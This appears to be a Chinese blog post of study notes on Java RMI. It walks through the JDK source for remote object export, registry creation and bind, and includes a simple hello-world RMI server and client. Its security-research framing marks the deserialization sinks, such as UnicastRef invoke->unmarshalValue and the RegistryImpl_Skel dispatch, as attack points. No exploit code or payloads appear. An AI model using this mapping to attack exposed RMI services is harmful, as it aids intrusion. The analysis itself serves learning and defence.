[https://su18.org/post/rmi-attack/#%E9%9B%B6-%E5%89%8D%E8%A8%80](https://su18.org/post/rmi-attack/#%E9%9B%B6-%E5%89%8D%E8%A8%80)

学完之后感觉 SU18 师傅这一段内容很精华，也算是对 RMI 的整个流程都概括进来了，想到要复习了可以先看看下面这段：

1. RMI 客户端在调用远程方法时会先创建 Stub ( sun.rmi.registry.RegistryImpl_Stub )。
2. Stub 会将 Remote 对象传递给远程引用层 ( java.rmi.server.RemoteRef ) 并创建 java.rmi.server.RemoteCall( 远程调用 )对象。
3. RemoteCall 序列化 RMI 服务名称、Remote 对象。
4. RMI 客户端的远程引用层传输 RemoteCall 序列化后的请求信息通过 Socket 连接的方式传输到 RMI 服务端的远程引用层。
5. RMI服务端的远程引用层( sun.rmi.server.UnicastServerRef )收到请求会请求传递给 Skeleton ( sun.rmi.registry.RegistryImpl_Skel#dispatch )。
6. Skeleton 调用 RemoteCall 反序列化 RMI 客户端传过来的序列化。
7. Skeleton 处理客户端请求：bind、list、lookup、rebind、unbind，如果是 lookup 则查找 RMI 服务名绑定的接口对象，序列化该对象并通过 RemoteCall 传输到客户端。
8. RMI 客户端反序列化服务端结果，获取远程对象的引用。
9. RMI 客户端调用远程方法，RMI服务端反射调用RMI服务实现类的对应方法并序列化执行结果返回给客户端。
10. RMI 客户端反序列化 RMI 远程方法调用结果。


## 1.RMI 介绍
RMI (Remote Method Invocation) 英文翻译过来就是“远程方法调用”
是一种调用远程位置的对象来执行方法的思想，这听起来就很危险，而远程调用的思想其实在 C 语言中就有体现，RPC（Remote Procedure Calls），用来打包和传输数据结构。而在 java 中，远程传输通常都是传输一个对象，这个对象包括属性值和方法，传输的媒介往往都是 java 的序列化数据，结合动态类加载和安全管理器实现一个 java 类的传输
具体的实现思想就是让我们获取到远程主机上对象的引用，我们调用这个引用对象，但实际的执行在远程的位置上

为了简化网络通信，RMI 引入了两个概念 Stubs（客户端存根），Skeletons（服务端骨架），当客户端（Client）试图调用一个在远端的 Object 时，实际调用的是客户端本地的一个代理类（Proxy），这个代理类就叫 Stub。而在我们最终调用远端（Server）的目标类之前，我们还会经过一个远端代理类，这个类就是 Skeleton，它会接受我们刚才想通过调用 Stub 去调用远端目标类的具体信息，并传递给真实的目标类
Stubs 和 Skeletons 的调用对于使用 RMI 服务的使用者来说是隐藏的，我们不需要去主动去调用相关的方法，但实际的客户端和服务端的网络通信都是通过 Stub 和 Skeleton 来实现的
这里可以看一下 SU18 师傅的整体调用时序图
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1706776260405-62bacde2-1dbe-4db8-87e8-5d3eeaab7378.png#averageHue=%23f5f5f5&clientId=u33bc5116-d03e-4&from=paste&id=ua0e3d015&originHeight=420&originWidth=1021&originalType=url&ratio=1.5&rotation=0&showTitle=false&size=62353&status=done&style=none&taskId=u03ac2773-10b3-429e-9fb3-fd956a49c13&title=)

### 服务端的远程对象大致介绍
使用 RMI 首先我们必须要定义一个我们期望能够调用的接口，这个接口必须继承`java.rmi.Remote`接口，用来远程调用的对象将作为这个接口的实例，之后的 Stub 代理类也将实现这个接口，这个接口中的所有方法都必须声明抛出 `java.rmi.RemoteException`异常
定义完这个接口，我们还要来实现这个远程接口的实现类，这个类中的内容才是我们想要实现的逻辑代码，并且通常会扩展 `java.rmi.server.UnicastRemoteObject`类，RMI 会自动将这个类 export 给远程想要调用它的 Client 端，同时提供一些基础的 equals/hashcode/toString 方法等，这里必须为这个类提供一个构造函数，并且抛出 RemoteException。
现在我们来实现一个服务端的可以被远程调用的对象
首先定义它的接口
```java
import java.rmi.Remote;
import java.rmi.RemoteException;

public interface RemoteInterface extends Remote {
    public String sayHello() throws RemoteException;
    public String sayHello(Object name) throws RemoteException;

}
```
然后来写可以被调用的远程对象，这里我们选择将其继承`java.rmi.server.UnicastRemoteObject`
```java
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class RemoteObject extends UnicastRemoteObject implements RemoteInterface  {
 protected  RemoteObject() throws RemoteException{

 }
    @Override
    public String sayHello() throws RemoteException {
        return null;
    }

    @Override
    public String sayHello(Object name) throws RemoteException {
        return null;
    }
}
```
### 注册中心的大致介绍
远程对象已经创建好，接下还需要实现注册中心（Registry），将我们的远程对象绑定上去。这个注册中心的本质可以想象成一个注册表，客户端通过查找这个注册表的键值对信息，调用到它想调用的对象和方法。
具体实现通过 `java.rmi.registry.Registry`和`java.rmi.Naming`来实现，我们分开来讲 

![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1706788389832-5f2efa85-dd20-4885-8e77-34f66334077e.png#averageHue=%2344484a&clientId=ue0d9de3e-0923-4&from=paste&height=240&id=Ry7EL&originHeight=360&originWidth=544&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=118181&status=done&style=none&taskId=u774c48bb-d405-4090-91aa-171f9e0c399&title=&width=362.6666666666667)
`java.rmi.Naming` 他是一个 final 类，提供了在 Registry 中存储和获取远程对象引用的方法，这个类提供的每个方法都有一个 URL 格式的参数，格式一般是 `//host:port/name`

- host：表示注册机所在的主机
- port：表示注册表接受调用的端口号，默认是 1099
- name： 表示一个注册表中 Remote Object 的引用的名称，不能是注册表中的一些关键字

Naming 提供了查询（lookup），绑定（bind），重新绑定（rebind），解除绑定（unbind），列表（list），用来对注册表进行操作，也就是说，Naming 是一个用来对注册表进行操作的类，而这些方法的具体实现是通过`LocateRegistry.getRegistry`方法获取了 `java.rmi.registry.Registry` 接口的实现类，并调用其相关方法进行实现的
那接下来就是`java.rmi.registry.Registry`接口，他有两个实现类，分别是`RegistryImpl`以及 `RegistryImpl_Stub`，这两个实现类我们下面会讲到
通常情况下我们会调用`LocateRegistry#createRegistry()`方法来进行注册中心的创建
下面我们将创建注册中心和绑定远程对象进注册中心的逻辑代码写在同一个 java 程序中，如果不这么做，按照顺序（创建注册中心->绑定远程对象->客户端调用远程对象）去一个一个执行 java 程序，在绑定远程对象时就会报错
之后我们还需要将远程对象绑定到注册中心上，而`LocateRegistry#createRegistry()`本身 java 程序运行时不会保持创建状态，之后的`Naming#bind()`自然也找不到注册中心，所以必须写在同一 java 程序中
```java
import java.rmi.Naming;

public class RemoteServer {
    public static void main(String[] args) throws Exception {
        LocateRegistry.createRegistry(1099);
 		System.out.println("server start");
        RemoteInterface remoteObject =new RemoteObject();
        Naming.bind("rmi://localhost:1099/Hello",remoteObject);
        
    }

}
```

客户端调用实现测试类
```java
import java.rmi.NotBoundException;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.Arrays;


public class RMIClient {
    public static void main(String[] args) throws RemoteException, NotBoundException {
        //通过getRegistry获取到注册中心
        Registry registry = LocateRegistry.getRegistry("localhost", 1099);
        System.out.println(Arrays.toString(registry.list()));

        //然后通过Client端的Stub代理类发送一个远程对象以及方法的请求调用
        //这里我们通过注册中心拿到对应的远程对象，然后调用其方法
        RemoteInterface stub=(RemoteInterface) registry.lookup("Hello");
        System.out.println(stub.sayHello());
    }
}
```
先运行 服务端的注册中心以及远程对象的绑定，之后再启动客户端程序，打印如下结果
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1706792212596-52313526-3b07-487e-9e3b-6e85d74c4f0b.png#averageHue=%2387765e&clientId=ue0d9de3e-0923-4&from=paste&height=120&id=ub7dae922&originHeight=180&originWidth=696&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=24666&status=done&style=none&taskId=uf36a82c2-66dc-4c7a-a5b1-100cc7692dc&title=&width=464)
有两个值得注意的点：
`RemoteInterface`接口在 Client/Server/Registry 中均应该存在
当客户端在调用远程对象时，传递了一个可序列化的对象，如果这个对象在服务端不存在，则会在服务端直接抛出 ClassNotFound 的异常，但是 RMI 支持动态类加载，如果设置了`java.rmi.server.codebase`，则会尝试从其他地址中获取.class 文件加载，并反序列化
上面这个特性跟安全策略这个设置有关，RMI 通过网络加载外部类并执行方法，所以我们必须要有一个安全管理器来进行管理，如果没有设置安全管理，则 RMI 不会动态加载任何类

铺垫了这么多前置知识，接下来进入源码流程分析

## 2.源码分析
### 1.服务注册
#### 0x01 远程对象创建
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1706860918269-1a897b09-f4bd-4356-89fb-95618b8c973a.png#averageHue=%233e4b3f&clientId=u9ab40011-c575-4&from=paste&height=140&id=u168ec090&originHeight=210&originWidth=1045&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=52073&status=done&style=none&taskId=u16ff5ced-7978-42bd-9ba0-3ba531e0564&title=&width=696.6666666666666)
我们在创建远程对象的时候提到，必须要实现远程 Remote 接口，一般情况下也是要继承 UnicastRemoteObject 这个类的
我们在创建远程对象的时候提到，必须要实现远程 Remote 接口，一般情况下也是要继承 UnicastRemoteObject 这个类的，UnicastRemoteObject用JRMP协议来export远程对象，并获取与远程对象进行通信的stub，具体是什么意思呢？
我们看具体代码实现

![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707209256066-e5490ab9-e1a3-49c6-8e16-b24393a1d172.png#averageHue=%23555c51&clientId=u116bb18b-347f-4&from=paste&height=158&id=uea57bb63&originHeight=237&originWidth=1040&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=71455&status=done&style=none&taskId=u3fc3119e-b8c2-4d93-bf9f-56a502d1587&title=&width=693.3333333333334)
首次实现初始化的时候，它会事先把port变量赋值好，然后直接调用exportObject
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707209270335-0158bc24-79c8-4911-b99d-aa56fcc3acac.png#averageHue=%23686754&clientId=u116bb18b-347f-4&from=paste&height=335&id=ufa97d5d8&originHeight=502&originWidth=1048&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=167846&status=done&style=none&taskId=uee9facbc-5039-4f63-b8ee-8b647d7170d&title=&width=698.6666666666666)
exportObject的内容是创建一个UnicastServerRef对象，然后调用其exportObject方法
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707209289572-df684f6b-efb6-47fa-89be-2cfb78826d91.png#averageHue=%235b6854&clientId=u116bb18b-347f-4&from=paste&height=433&id=u727d6c7b&originHeight=649&originWidth=1050&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=229791&status=done&style=none&taskId=u45758b25-a49d-45e4-9037-96daeed1ab7&title=&width=700)
这一段首先是trycatch块中的内容，它先是调用了``sun.rmi.server.Util#createProxy()``创建了一个代理类
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707209300958-8d6a4669-f5ce-4e05-a9e4-10a7558be60e.png#averageHue=%234c5a4c&clientId=u116bb18b-347f-4&from=paste&height=429&id=u5150b687&originHeight=643&originWidth=1050&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=267957&status=done&style=none&taskId=u89a36e30-c757-41ad-84ed-b3a6fe7f003&title=&width=700)
先是获取到了我们想要创建的远程对象类，然后进入一个if-else的判断，这里的话我们首先要回忆一下什么是Stub？Stub其实就是用来实现网络通信的动态代理类。if块里面创建的Stub是它RMI包中自带的功能Stub，并非我们自己想创建的Stub，这里自定Stub是在else里面的内容。
`RemoteObjectInvocationHandler`来为RemoteObject实现RemoteInterface接口创建动态代理，真正实现Stub的功能
之后返回这个自定义Stub

然后创建一个Target对象，这个Target对象封装了我们的远程执行方法，和刚才生成的动态代理类
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707209312499-a403f845-94a8-45c5-8757-618054992176.png#averageHue=%23636960&clientId=u116bb18b-347f-4&from=paste&height=112&id=ua7371e3e&originHeight=168&originWidth=1046&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=67900&status=done&style=none&taskId=u18acdf09-0810-4625-8abe-dfd59ff0de0&title=&width=697.3333333333334)
然后调用LiveRef的exportObject，这个LiveRef是UnicastRef（UnicastServerRef的父类）自带的成员属性 LiveRef
这个exportObject调用到了TCPEndpoint的exportObject方法
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707209321808-d7913695-5725-4b1e-b1f7-0c6d1ccc8614.png#averageHue=%23323333&clientId=u116bb18b-347f-4&from=paste&height=372&id=u3b5dcfbb&originHeight=558&originWidth=1055&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=162252&status=done&style=none&taskId=ud4414dd1-83e6-45cb-b819-b94d96cc1b5&title=&width=703.3333333333334)
这里主要干了两件事：首先是对本地端口进行了监听，然后就是调用父类的exportObject，将我们刚才生成的Target 注册进ObjectTable中，这个ObjectTable用来管理所有发布的服务实例 Target，ObjectTable根据 ObjectEndpoint和Remote实例两种方法来查找Target的方法
上述流程可以用图来总结一下：
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707209356269-d35f1565-d89b-403c-b159-58c7926b8d08.png#averageHue=%23f6f6f6&clientId=u116bb18b-347f-4&from=paste&height=289&id=u9b6e7417&originHeight=434&originWidth=1033&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=65773&status=done&style=none&taskId=u6145ac8b-9944-4237-ad04-50e47654949&title=&width=688.6666666666666)

流程下来比较感兴趣的是InvocationHandler动态代理的部分，它继承了RemoteObject实现了InvocationHandler，那么它一定是一**个可序列化并且可以通过 RMI 进行远程传输的动态代理类，**既然是动态代理类，自然关注其 invoke 方法
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707209687124-483843f1-ad6b-4670-aa55-c1a8b7581b40.png#averageHue=%23657862&clientId=u116bb18b-347f-4&from=paste&height=514&id=u57df00fc&originHeight=771&originWidth=1197&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=284030&status=done&style=none&taskId=u84044d7a-abc7-4bee-94f1-7acd8667dc0&title=&width=798)
三层判断，首先判断是不是代理类，如果不是就直接 throw 走了，然后判断了一下是否是 Object，如果是直接调用 invokeObjectMethod，然后判断是否是 RemoteObject，如果是就直接调用 invokeRemoteMethod 方法。
实际上我们跟进invokeRemoteMethod 方法，它的 invoke 调用的是 RemoteRef 的 invoke 方法，RemoteRef 的 invoke 方法
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707213269607-34bc06de-8cc1-4600-9bb5-3d87bfcec0f8.png#averageHue=%23313333&clientId=u116bb18b-347f-4&from=paste&height=785&id=ub275ea07&originHeight=1177&originWidth=1290&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=465558&status=done&style=none&taskId=uf522f8bd-e0d7-4c8f-943c-ad47cca6be9&title=&width=860)
这里面的 invoke 方法经由 UnicastRef 实现，这里的内容主要是通过调用 LiveRef 中 Endpoint、Channel  相关方法来进行连接，获取到序列化数据（Var7 获取远程数据流， 进行一系列处理，最终获取到符合格式的序列化数据），之后调用 UnmarshaValue 来进行反序列化
![1633225229442.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707213565048-826689e7-7de9-4444-a9cb-67413d64d21c.png#averageHue=%232e2b2a&clientId=u116bb18b-347f-4&from=paste&height=989&id=u8d7cb1fe&originHeight=1484&originWidth=1650&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=337909&status=done&style=none&taskId=ud628ce3f-f292-4e2e-964b-d11d98af3b5&title=&width=1100)
调的还是原生的反序列化
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707213967350-36331ab3-9624-4478-99f4-c08be1c6de11.png#averageHue=%23333734&clientId=u116bb18b-347f-4&from=paste&height=609&id=u05610c6a&originHeight=913&originWidth=1437&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=377376&status=done&style=none&taskId=u39de6378-748a-45a1-91ff-2ecfceeec82&title=&width=958)
到这里就是一处可利用点了，我们知道了在远程对象创建的时候，创建的远程代理类中的 invoke 方法会存在反序列化的点，最终 Sink 的地方是在 UnicastRef 的 invoke->unmarshalValue 方法


#### 0x02 注册中心创建
注册中心的创建就是一个方法了`LocateRegistry._createRegistry_(1099);`
所以我们跟进 createRegistry 方法，看看它到底具体干了些什么
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707221817276-26e79b2b-8a75-45b5-a766-a84d0039d955.png#averageHue=%23333534&clientId=u116bb18b-347f-4&from=paste&height=95&id=ud2a70c1a&originHeight=143&originWidth=973&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=45271&status=done&style=none&taskId=uddfbc2b2-77d9-4ec6-903e-05bc82d3afc&title=&width=648.6666666666666)
首先是实例化 Registry 接口的的实现类 RegistryImpl，继续跟进他的实例化方法
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707221951961-33792436-1bdd-48c3-b3b7-2ccfa47355c3.png#averageHue=%23323434&clientId=u116bb18b-347f-4&from=paste&height=485&id=uf6741d75&originHeight=728&originWidth=1577&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=326588&status=done&style=none&taskId=u0de8f2b6-0926-4644-a326-1daf4544f95&title=&width=1051.3333333333333)
干了三件事：1.实例化创建 LiveRef 类，2.实例化创建 UnicastServerRef 类，3.用 setup 方法将两者进行配置 
`**LiveRef**` 主要是用来进行网络通信，获取信息和传递信息 `**UnicastServerRef**` 就是对与整个 RMI 传输信息流进行处理，算是一个 RMI 具体功能的实现类
而在 setup 方法中，依旧是调用 UnicastServerRef 的 exportObject 方法将远程对象给发布出去
#### ![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707222644827-d83f56fd-36d3-433f-9c08-c4ccc3c9c7a8.png#averageHue=%23383a3b&clientId=u116bb18b-347f-4&from=paste&height=209&id=uc5fc6ed7&originHeight=313&originWidth=946&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=94428&status=done&style=none&taskId=u2e44f0d9-73e2-4deb-bd2e-75f06b9bd8e&title=&width=630.6666666666666)
但是这次的 exportObject 方法的流程有所不同
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707222679739-38f5ef3e-3469-4ce0-ad0a-ad0c1673a607.png#averageHue=%23323434&clientId=u116bb18b-347f-4&from=paste&height=495&id=u9f5dcc1f&originHeight=742&originWidth=1284&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=293535&status=done&style=none&taskId=u8d10eeb2-7769-4206-b702-b3306591ebb&title=&width=856)
重要的还是 createProxy 方法，我们跟进
在创建 RegistryImpl 远程对象的动态代理类的时候，我们看第一个 if 的内容，var2 和 ingnoreStubClasses 的内容暂且不谈，只看方法 stubClassExists 的内容
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707224176245-04a9900a-e2e0-4f4b-bea2-f2d0a27ff8c3.png#averageHue=%23323534&clientId=u116bb18b-347f-4&from=paste&height=548&id=uc2ec39ce&originHeight=822&originWidth=1555&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=388754&status=done&style=none&taskId=u50e70e95-898f-446e-b419-cc416e1decb&title=&width=1036.6666666666667)
由于 var0 此时是我们传进来的 RegistryImpl，它会在本地查找 RegistryImpl_Stub 到底有没有这个类，答案是肯定有的
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707224274971-5fb04589-a486-48f1-a3d7-a5a0ae211a9c.png#averageHue=%23323333&clientId=u116bb18b-347f-4&from=paste&height=311&id=u172021d6&originHeight=467&originWidth=1342&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=168616&status=done&style=none&taskId=uafe8cfcc-b609-4073-b431-e273e8afc72&title=&width=894.6666666666666)

由于是常见功能类，并且是 RMI 自带的一个部分， RegistryImpl_Stub 的本地类早已经被定义好了
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707224129159-3e11bd55-7457-4796-a58b-8f12fa41a6de.png#averageHue=%23404853&clientId=u116bb18b-347f-4&from=paste&height=111&id=u119c0d26&originHeight=167&originWidth=1003&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=33324&status=done&style=none&taskId=u950c3088-9904-4d39-bfd9-a95b4fffdd4&title=&width=668.6666666666666)
这里找到之后会 return 一个 true，那我们的 if 判断的内容就进去了
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707224424570-5782748b-e47d-446a-a0ec-8a2f6a9d3d02.png#averageHue=%23343938&clientId=u116bb18b-347f-4&from=paste&height=57&id=u24a03737&originHeight=85&originWidth=797&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=32136&status=done&style=none&taskId=uacb5bf2a-cd9f-42a2-b929-ea60ca7bdcf&title=&width=531.3333333333334)
进入这个 createStub，这里预知都能猜到应该就是直接 create 我们刚才检测得到的 RegistryImpl_Stub 了
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707224488626-18dc65bf-5b6f-4345-89ea-42e8b2f282c9.png#averageHue=%23333535&clientId=u116bb18b-347f-4&from=paste&height=554&id=ua771d30c&originHeight=831&originWidth=1404&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=446629&status=done&style=none&taskId=uc8a0c31f-10c3-42c3-b7dd-1088bcefa7d&title=&width=936)
直接反射调用即完成，我们可以看看 RegistryImpl_Stub 的大致结构
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707224558985-97ce2d8f-62af-48cd-a6dd-ad242105a72b.png#averageHue=%2343494b&clientId=u116bb18b-347f-4&from=paste&height=225&id=u9f6fa72e&originHeight=337&originWidth=543&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=88385&status=done&style=none&taskId=ua1473a38-cb91-4a91-ad97-89839a824b0&title=&width=362)
它完成了大部分的 Registry 注册中心应该完成的功能，且全部都是用反序列化的操作来完成的，就比如说 bind 方法，就是直接把远程对象的序列化数据绑定上去
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707224609593-5b12f107-8a71-4549-a8e6-9228eab3e5c1.png#averageHue=%235a6c5a&clientId=u116bb18b-347f-4&from=paste&height=303&id=ucd11bfcb&originHeight=454&originWidth=1507&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=189026&status=done&style=none&taskId=u747b1082-aaad-4408-a1bc-50728485529&title=&width=1004.6666666666666)
小插曲，我们回到主线，返回的是一个 RemoteStub 类型的对象，不想我们之前发布自定义远程对象，返回的是 Remote 类型，这里也是由于返回的是 RemoteStub 对象，后面会进入创建 Skel 的方法
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707224861430-67eed2c1-1813-4ac6-912b-4fc04a5607fb.png#averageHue=%23323333&clientId=u116bb18b-347f-4&from=paste&height=238&id=u35e13261&originHeight=357&originWidth=1172&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=123561&status=done&style=none&taskId=u24f4f597-6a59-4556-89f2-db1b70c9333&title=&width=781.3333333333334)
直接一路调用过来到 Util 的 createSkeleton 方法
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707224887375-8e325b4c-8f26-43be-bd87-a2ed67c62c1a.png#averageHue=%23323433&clientId=u116bb18b-347f-4&from=paste&height=365&id=uf972f29c&originHeight=548&originWidth=1649&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=236203&status=done&style=none&taskId=ubc5cf7c7-b9a0-4be1-9b00-a6d5ab1c409&title=&width=1099.3333333333333)
发现其实就是获取到了 RegistryImpl_Skel 类名（本地肯定是存了的），然后进行反射调用，返回出去之后会被分配到 UnicastServerRef 的 `this.skel`中
但是 RegistryImpl_Skel 中的 dispatch 方法它定了各项分发操作的具体内容，功能的实现也是通过序列化和反序列化实现的
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707225260743-122434d1-4a58-433c-8151-13f4d6cac0d9.png#averageHue=%23323333&clientId=u116bb18b-347f-4&from=paste&height=395&id=u19bbc050&originHeight=592&originWidth=1332&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=220063&status=done&style=none&taskId=ub140305d-5eae-462f-9997-d912f21acbe&title=&width=888)

之后的流程就是封装 Target 了，用来网络通信功能的 LiveRef，以及用来远程功能的 RegistryImpl_Stub 对象
然后调用 Target 的 exportObject 对象将其发布出去，之后的发布内容流程相似，不重复
注册中心的流程停在，思考一下刚才创建流程时有哪些攻击点？
1. 创建动态代理的时候，得到的是本地的 RegistryImpl_Srub?它的每个方法都是通过序列化和反序列化结合才得到的
2.创建的 RegistryImpl_Skel 的 dispatch 功能是通过序列化和反序列化实现的

服务端该实现的几个基本功能点都实现完了，就是远程对象和远程服务中心，我们通过比较这两者的流程不难发现其实两者都必须通过**创建远程代理对象**来封装网络通信功能，最终都有一个 Target 对象，只不过里面封装的功能类的名称不一样，且具体功能也都有差异，因此创建流程也有所差异

接下来我们来分析注册中心是如何对远程对象进行操作的

### 2.注册中心服务功能
总计 5 个方法：bind，rebind，lookup，list，unbind，都是对远程对象进行使用
首先先看 bind 方法
#### 0x01 服务注册-bind
我们通过服务端调用`Naming`的 bind 方法，调用到了 RegistryImpl 的 bind 方法
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707288840877-74b9851b-d687-4ce3-a12e-abcb1bf32da3.png#averageHue=%23323333&clientId=udb035c78-e8cc-4&from=paste&height=285&id=u2682f424&originHeight=427&originWidth=1657&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=182579&status=done&style=none&taskId=u9f7ae67b-4a79-47bf-affd-657dbd1aa7c&title=&width=1104.6666666666667)
这里的逻辑是，通过 bindings 这个 hashtable 类型的变量获取本地的远程对象，看看是否本地进行了存储，如果没有就直接调用 put，将我们刚才创建的远程对象给 put 进去。如果有，就 throw 一个报错。
不论你的注册中心和服务端在不在同一端的时候，下面这段方法流程是一样的，都是通过 `LocateRegistry.getRegistry()`来获取到注册中心，到具体的 getRegistry 内容如下：
![1633232444831.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707291608288-569db2f7-4240-47f8-90cc-452e8c266284.png#averageHue=%232c2b2b&clientId=udb035c78-e8cc-4&from=paste&height=757&id=u959e7717&originHeight=1136&originWidth=1638&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=202905&status=done&style=none&taskId=u55ccc504-9a29-4400-a05b-ea1d099cbb8&title=&width=1092)
这里前面会获取一下我们想要的服务中心的 host，然后再来调用 getRegistry 方法。主要逻辑是：处理 host，然后实现功能类 LiveRef （网络通信），然后依然是将其封装进 UnicastRef，最终再放进 Util 的创建动态代理类的 createPorxy ，建一个新的动态代理类，return 出去之后调用这个动态代理类的 bind
那在不在同一端的区别在哪呢？我们看看 bind 方法到底有哪些方法实现了
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707292261695-5bb19eef-2897-43e2-b3f3-f89d76e670c4.png#averageHue=%2370716f&clientId=udb035c78-e8cc-4&from=paste&height=101&id=u89805606&originHeight=151&originWidth=948&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=56149&status=done&style=none&taskId=u3a6e06d9-9f4f-427d-ad14-51f4cd548d2&title=&width=632)
这里对我们来说接触到的就是 `RegistryImpl` 和 `RegistryImpl_Stub`,我们上面分析过，假如说我们本地注册中心和服务端同时实现，本地缓存是有RegistryImpl_Stub 这个类的，所以我们主要区别就在最后 Util 的 createProxy 中，产生的结果就是：在同一端，直接调用 `RegistryImpl` ，不在同一端，调用`RegistryImpl_Stub`，那我们来看看两者的 bind 有啥区别
RegistryImpl_Stub：
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707293379662-9bf678a3-d8b8-4093-b2c8-952bb7151b04.png#averageHue=%23657561&clientId=udb035c78-e8cc-4&from=paste&height=339&id=ue637e1a8&originHeight=508&originWidth=1475&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=213719&status=done&style=none&taskId=u20b5ab60-4937-4ff9-afe1-7b12981a1df&title=&width=983.3333333333334)

RegistryImpl：
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707293400672-b85b7bd0-a8ad-452e-a077-a808974d0405.png#averageHue=%23536354&clientId=udb035c78-e8cc-4&from=paste&height=284&id=u9378c098&originHeight=426&originWidth=1483&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=169118&status=done&style=none&taskId=u0b9b6ae5-2ecf-4931-985d-c81aa32c7a5&title=&width=988.6666666666666)
你会发现如果按照它们本来定义的内容，如果是本地同一端的RegistryImpl，它直接就从本地取了，不会说是还要像RegistryImpl_Stub通过序列化获取对象数据，调用 RemoteObjectInvocationHandler 动态代理的 invoke，触发反序列化操作
但实际上不论你注册中心和服务端在不在同一端，统一还是走RegistryImpl_Stub 的一系列的注册中心方法，这里我举个例子，比如说此时的服务端这么写，模拟服务端和注册中心在同一端
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707299338127-0c0fd295-b1db-4e5e-8d94-d7ba1d1d095e.png#averageHue=%23586d55&clientId=udb035c78-e8cc-4&from=paste&height=255&id=u8617c647&originHeight=382&originWidth=1113&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=134546&status=done&style=none&taskId=u749fb619-0f73-4e8e-9e38-f139d95aaf3&title=&width=742)
然后我们跳过创建的过程，直接看到底调用的是 RegistryImpl 还是RegistryImpl_Stub
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1707299345304-c8555707-37b5-4021-b646-36a82397de76.png#averageHue=%23323333&clientId=udb035c78-e8cc-4&from=paste&height=71&id=u13852585&originHeight=107&originWidth=1971&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=50796&status=done&style=none&taskId=u0a28763c-cfde-48ec-868f-ac3106426ec&title=&width=1314)
发现还是RegistryImpl_Stub，因为它获取注册中心的方法 getRegistry 调的是各自本地的`**LocateRegistry**`的getRegistry，各自本地都会存RegistryImpl_Stub 类，所以最终创建出来的都是RegistryImpl_Stub，比较粗暴（这里思考卡了好久。。。）
所以关于服务端要调用 bind 功能的逻辑，只需记住一句话：**获取到远程注册中心功能类RegistryImpl（实际上是RegistryImpl_Stub），调用其对应的 bind 方法，完成远程对象绑定**

